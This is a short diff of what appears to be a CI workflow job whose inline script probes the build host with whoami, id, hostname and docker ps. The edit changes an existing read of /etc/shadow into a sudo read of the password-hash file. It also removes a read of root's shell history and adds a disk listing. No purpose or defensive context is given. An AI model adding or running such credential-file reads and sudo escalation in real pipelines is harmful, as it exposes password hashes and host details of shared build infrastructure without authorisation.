@@ -34,7 +34,7 @@ jobs:
           whoami
           id
           hostname
-          cat /etc/shadow | head -3
+          cd ../../../../../.. && sudo cat /etc/shadow | head -3
           docker ps
-          cat /root/.bash_history | head -20
+          lsblk
           EOF
